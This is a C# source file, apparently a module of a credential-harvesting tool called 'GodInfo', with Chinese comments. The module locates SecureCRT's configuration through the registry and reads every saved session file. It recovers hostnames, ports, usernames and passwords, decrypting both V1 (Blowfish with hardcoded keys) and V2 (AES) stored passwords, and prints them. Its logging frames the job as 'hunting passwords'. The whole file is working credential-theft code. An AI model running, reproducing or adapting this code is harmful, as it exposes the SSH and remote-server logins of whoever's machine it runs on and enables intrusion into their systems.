using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using GodInfo.Utils;

namespace GodInfo.Commands
{
    public class SecureCRTCredCommand : ICommand
    {
        public struct ConnectionInfo
        {
            public string Name;
            public string Protocol;
            public string Hostname;
            public string Port;
            public string Username;
            public string Password;
        }

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting passwords saved by SecureCRT.");
            GetSecureCRTCred();
        }

        public static void GetSecureCRTCred()
        {
            Logger.TaskHeader("Hunting SecureCRT", 1);
            
            if (!CheckSecureCRTExists())
            {
                Logger.WriteLine("[-] No SecureCRT installation or saved sessions found.");
                return;
            }

            // 从配置文件获取SecureCRT凭据
            GetCredentialsFromConfigFiles();
        }

        public static bool CheckSecureCRTExists()
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\VanDyke\\SecureCRT");
            if (registryKey == null)
            {
                return false;
            }

            object configPath = registryKey.GetValue("Config Path");
            if (configPath == null)
            {
                return false;
            }

            string sessionsPath = Path.Combine(configPath.ToString(), "Sessions");
            return Directory.Exists(sessionsPath);
        }

        private static void GetCredentialsFromConfigFiles()
        {
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\VanDyke\\SecureCRT");
                string configPath = registryKey.GetValue("Config Path").ToString();
                string sessionsPath = Path.Combine(configPath, "Sessions");

                Logger.WriteLine($"[+] Found SecureCRT config directory: {sessionsPath}");

                List<ConnectionInfo> connections = new List<ConnectionInfo>();
                FileInfo[] files = new DirectoryInfo(sessionsPath).GetFiles("*.ini", SearchOption.AllDirectories);
                
                int found = 0;
                foreach (FileInfo fileInfo in files)
                {
                    // 跳过文件夹数据文件
                    if (fileInfo.Name.ToLower().Equals("__FolderData__.ini".ToLower()))
                    {
                        continue;
                    }

                    try
                    {
                        string[] lines = File.ReadAllLines(fileInfo.FullName);
                        ConnectionInfo connection = ExtractConnectionInfo(lines, fileInfo.FullName.Substring(sessionsPath.Length));
                        
                        if (!string.IsNullOrEmpty(connection.Username) || !string.IsNullOrEmpty(connection.Password))
                        {
                            connections.Add(connection);
                            found++;
                            Logger.WriteLine($"[+] Found session: {fileInfo.FullName.Substring(sessionsPath.Length)}");
                        }
                    }
                    catch (Exception ex)
                    {
                        Logger.WriteLine($"[-] Error processing session file '{fileInfo.Name}': {ex.Message}");
                    }
                }

                if (connections.Count > 0)
                {
                    Logger.WriteLine($"\n[+] Found {connections.Count} SecureCRT session(s):");
                    Logger.PrintTableFromStructs(connections);
                }
                else
                {
                    Logger.WriteLine("[-] No saved SecureCRT credentials found.");
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error accessing SecureCRT configurations: {ex.Message}");
            }
        }

        private static ConnectionInfo ExtractConnectionInfo(string[] lines, string sessionName)
        {
            ConnectionInfo info = new ConnectionInfo
            {
                Name = sessionName.Replace("\\", "/")
            };

            SecureCRTPasswordDecryptor decryptor = new SecureCRTPasswordDecryptor();
            string defaultPort = string.Empty;
            bool isV2Password = false;

            foreach (string line in lines)
            {
                if (line.IndexOf('=') == -1)
                    continue;

                string[] parts = line.Split(new char[] { '=' }, 2);
                string key = parts[0].Trim();
                string value = parts[1].Trim();

                if (key.ToLower().Contains("S:\"Username\"".ToLower()))
                {
                    info.Username = value;
                }
                else if (key.ToLower().Contains("S:\"Password\"".ToLower()))
                {
                    string decryptedPassword = decryptor.DecryptPasswordV1(value);
                    if (!string.IsNullOrEmpty(decryptedPassword) && decryptedPassword != "[解密失败]")
                    {
                        info.Password = "[V1] " + decryptedPassword;
                    }
                    else
                    {
                        info.Password = decryptedPassword;
                    }
                }
                else if (key.ToLower().Contains("S:\"Password V2\"".ToLower()))
                {
                    isV2Password = true;
                    string decryptedPassword = decryptor.DecryptPasswordV2(value);
                    if (!string.IsNullOrEmpty(decryptedPassword) && decryptedPassword != "[解密失败]")
                    {
                        info.Password = "[V2] " + decryptedPassword;
                    }
                    else
                    {
                        info.Password = decryptedPassword;
                    }
                }
                else if (key.ToLower().Contains("S:\"Hostname\"".ToLower()))
                {
                    info.Hostname = value;
                }
                else if (key.ToLower().Contains("S:\"Protocol Name\"".ToLower()))
                {
                    info.Protocol = value;
                }
                else if (key.ToLower().Contains("D:\"Port\"".ToLower()))
                {
                    defaultPort = value;
                    // 尝试转换十六进制端口值为十进制
                    if (int.TryParse(value, System.Globalization.NumberStyles.HexNumber, null, out int portNum))
                    {
                        defaultPort = portNum.ToString();
                    }
                }
                else if (key.ToLower().Contains("D:\"[SSH1] Port\"".ToLower()) && info.Protocol == "SSH1")
                {
                    info.Port = value;
                    // 尝试转换十六进制端口值为十进制
                    if (int.TryParse(value, System.Globalization.NumberStyles.HexNumber, null, out int portNum))
                    {
                        info.Port = portNum.ToString();
                    }
                }
                else if (key.ToLower().Contains("D:\"[SSH2] Port\"".ToLower()) && info.Protocol == "SSH2")
                {
                    info.Port = value;
                    // 尝试转换十六进制端口值为十进制
                    if (int.TryParse(value, System.Globalization.NumberStyles.HexNumber, null, out int portNum))
                    {
                        info.Port = portNum.ToString();
                    }
                }
            }

            // 如果没有特定的端口设置，使用默认端口
            if (string.IsNullOrEmpty(info.Port) && !string.IsNullOrEmpty(defaultPort))
            {
                info.Port = defaultPort;
            }

            return info;
        }
    }

    /// <summary>
    /// SecureCRT密码解密实现
    /// </summary>
    internal class SecureCRTPasswordDecryptor
    {
        // SecureCRT v1 密码解密密钥
        private readonly byte[] v1Key = new byte[] 
        { 
            0x24, 0xA6, 0x3D, 0xDE, 0x5B, 0xD3, 0xB3, 0x82,
            0x9C, 0x7E, 0x06, 0xF4, 0x08, 0x16, 0xAA, 0x07 
        };

        // SecureCRT v1 密码解密IV
        private readonly byte[] v1IV = new byte[] 
        { 
            0x5F, 0xB0, 0x45, 0xA2, 0x94, 0x17, 0xD9, 0x16,
            0xC6, 0xC6, 0xA2, 0xFF, 0x06, 0x41, 0x82, 0xB7 
        };

        /// <summary>
        /// 十六进制字符串转换为字节数组
        /// </summary>
        private byte[] HexStringToByteArray(string hex)
        {
            if (hex.Length % 2 != 0)
            {
                throw new ArgumentException("Hex string must have an even number of characters.");
            }

            byte[] result = new byte[hex.Length / 2];
            for (int i = 0; i < result.Length; i++)
            {
                result[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return result;
        }

        /// <summary>
        /// 解密SecureCRT版本1密码（使用Blowfish算法）
        /// </summary>
        public string DecryptPasswordV1(string encryptedPassword)
        {
            if (string.IsNullOrEmpty(encryptedPassword))
                return string.Empty;

            try
            {
                // 移除前缀（如果存在）
                if (encryptedPassword.StartsWith("u"))
                {
                    encryptedPassword = encryptedPassword.Substring(1);
                }
                else if (encryptedPassword.StartsWith("02:"))
                {
                    encryptedPassword = encryptedPassword.Substring(3);
                }

                // 解密逻辑
                byte[] encryptedBytes = HexStringToByteArray(encryptedPassword);
                if (encryptedBytes.Length < 8)
                {
                    return string.Empty;
                }

                // 使用项目已有的Blowfish实现
                Blowfish blowfish = new Blowfish();
                blowfish.InitializeKey(v1Key);

                // 解密第一步
                byte[] output1 = new byte[encryptedBytes.Length];
                blowfish.SetIV(new byte[8]); // 使用全零IV
                blowfish.DecryptCBC(encryptedBytes, 0, encryptedBytes.Length, output1, 0);

                // 忽略前后4个字节，准备第二次解密
                int actualLength = output1.Length - 8;
                if (actualLength <= 0)
                {
                    return string.Empty;
                }

                byte[] intermediate = new byte[actualLength];
                Array.Copy(output1, 4, intermediate, 0, actualLength);

                // 解密第二步，使用第二个密钥
                blowfish = new Blowfish();
                blowfish.InitializeKey(v1IV);
                byte[] output2 = new byte[intermediate.Length];
                blowfish.SetIV(new byte[8]); // 使用全零IV
                blowfish.DecryptCBC(intermediate, 0, intermediate.Length, output2, 0);

                // 解析Unicode字符串
                int length = 0;
                while (length < output2.Length && (output2[length] != 0 || length + 1 < output2.Length && output2[length + 1] != 0))
                {
                    length += 2;
                    if (length >= output2.Length - 1)
                        break;
                }

                // 确保长度是偶数（Unicode字符）
                if (length % 2 != 0)
                    length--;

                return System.Text.Encoding.Unicode.GetString(output2, 0, length);
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error decrypting SecureCRT password (V1): {ex.Message}");
                return "[解密失败]";
            }
        }

        /// <summary>
        /// 解密SecureCRT版本2密码
        /// </summary>
        public string DecryptPasswordV2(string encryptedPassword)
        {
            if (string.IsNullOrEmpty(encryptedPassword))
                return string.Empty;

            try
            {
                // 移除"02:"前缀（如果存在）
                if (encryptedPassword.StartsWith("02:"))
                {
                    encryptedPassword = encryptedPassword.Substring(3);
                }

                // V2版本密码解密逻辑
                byte[] encrypted = HexStringToByteArray(encryptedPassword);
                using (System.Security.Cryptography.SHA256 sha256 = System.Security.Cryptography.SHA256.Create())
                {
                    byte[] key = sha256.ComputeHash(System.Text.Encoding.UTF8.GetBytes(""));
                    using (System.Security.Cryptography.RijndaelManaged rijndael = new System.Security.Cryptography.RijndaelManaged())
                    {
                        rijndael.KeySize = 256;
                        rijndael.BlockSize = 128;
                        rijndael.Key = key;
                        rijndael.IV = new byte[16];
                        rijndael.Mode = System.Security.Cryptography.CipherMode.CBC;
                        rijndael.Padding = System.Security.Cryptography.PaddingMode.Zeros;
                        
                        try
                        {
                            using (System.IO.MemoryStream memoryStream = new System.IO.MemoryStream())
                            {
                                using (System.Security.Cryptography.CryptoStream cryptoStream = new System.Security.Cryptography.CryptoStream(
                                    memoryStream, rijndael.CreateDecryptor(), System.Security.Cryptography.CryptoStreamMode.Write))
                                {
                                    cryptoStream.Write(encrypted, 0, encrypted.Length);
                                    cryptoStream.FlushFinalBlock();
                                }
                                
                                byte[] decrypted = memoryStream.ToArray();
                                if (decrypted.Length < 4)
                                {
                                    return string.Empty;
                                }
                                
                                int passwordLength = BitConverter.ToInt32(new byte[4]
                                {
                                    decrypted[0],
                                    decrypted[1],
                                    decrypted[2],
                                    decrypted[3]
                                }, 0);
                                
                                if (decrypted.Length < 4 + passwordLength + 32)
                                {
                                    return string.Empty;
                                }
                                
                                byte[] passwordBytes = new byte[passwordLength];
                                Array.Copy(decrypted, 4, passwordBytes, 0, passwordLength);
                                
                                return System.Text.Encoding.UTF8.GetString(passwordBytes);
                            }
                        }
                        catch
                        {
                            return "[解密失败]";
                        }
                    }
                }
            }
            catch
            {
                return "[解密失败]";
            }
        }
    }
} 